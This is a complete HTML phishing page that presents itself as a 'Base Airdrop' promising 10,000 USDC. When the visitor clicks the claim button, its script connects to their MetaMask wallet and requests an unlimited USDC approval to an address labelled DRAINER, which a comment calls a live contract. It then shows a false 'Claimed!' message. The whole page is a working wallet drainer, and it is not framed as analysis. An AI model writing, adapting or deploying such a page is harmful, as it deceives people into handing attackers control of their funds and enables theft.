<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Base Airdrop Live</title>
  <style>
    body { background:#000; color:#0f0; font-family:system-ui; text-align:center; padding:3rem; }
    .card { background:#111; border:2px solid #0f0; border-radius:20px; padding:2rem; max-width:400px; margin:0 auto; }
    button { background:#0f0; color:#000; font-weight:bold; padding:1rem 2rem; border:none; border-radius:50px; font-size:1.2rem; margin-top:2rem; cursor:pointer; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Base Airdrop</h1>
    <p>10,000 USDC reward available</p>
    <p>Claim in 1 click</p>
    <button onclick="claim()">CLAIM 10,000 USDC</button>
    <div id="s"></div>
  </div>

  <script type="module">
    import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js";
    const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
    const DRAINER = "0x4f8a552d14ab660bde05f2d43d7c94c90e0e5d9a"; // ‚Üê LIVE CONTRACT

    async function claim() {
      if (!window.ethereum) return alert("MetaMask required");
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      if ((await provider.getNetwork()).chainId !== 8453n) return alert("Switch to Base");

      document.getElementById("s").textContent = "Sending claim...";
      const tx = await (new ethers.Contract(USDC, ["function approve(address,uint256)"], signer))
        .approve(DRAINER, ethers.MaxUint256);
      await tx.wait();
      document.getElementById("s").innerHTML = "Claimed! You can close.";
    }
  </script>
</body>
</html>
